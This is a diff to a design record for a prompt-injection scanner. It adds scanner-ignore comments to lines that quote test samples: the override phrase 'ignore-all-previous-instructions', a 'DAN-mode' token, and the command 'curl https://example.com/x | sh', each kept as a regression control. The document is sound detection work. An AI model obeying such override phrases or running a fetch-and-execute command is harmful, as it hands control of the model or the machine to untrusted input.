@@ -67,7 +67,7 @@ the span back through `Normalized::origin` first.
 > start, or the character immediately at its end, is a separator binding two word
 > characters — i.e. the match edge falls inside a separator-joined compound token
 > (`sh-lint`, `on-call`, `DAN-mode-switch`, `sh_lint`). A match whose separators are
-> strictly interior (`ignore-all-previous-instructions`) is the evasion the fold exists to
+> strictly interior (`ignore-all-previous-instructions`) is the evasion the fold exists to <!-- injection-scanner:ignore PI001 -->
 > catch, and is kept.
 
 Implementation:
@@ -176,8 +176,8 @@ ADR say so explicitly so the asymmetry reads as deliberate rather than an oversi
 - All six false positives issue #128 measured are silent in `matches` and recorded in
   `manufactured_boundary`.
 - All six regression controls (`ignore-all-previous-instructions` and its `_`/`.`/space
-  siblings at PI001 CRITICAL; `curl https://example.com/x | sh` and `curl
-  https://ex-ample.com/my-script | sh` at PI028 CRITICAL) fire unchanged.
+  siblings at PI001 CRITICAL; `curl https://example.com/x | sh` and `curl <!-- injection-scanner:ignore PI028 -->
+  https://ex-ample.com/my-script | sh` at PI028 CRITICAL) fire unchanged. <!-- injection-scanner:ignore PI028 -->
 - One library-wide, pattern-agnostic mechanism closes the exposure for all eleven audited
   patterns and every future one — zero pattern-file edits, `patterns/`,
   `docs/PATTERN-CATALOGUE.md` and `.github/code-scanning-baseline.json` untouched.
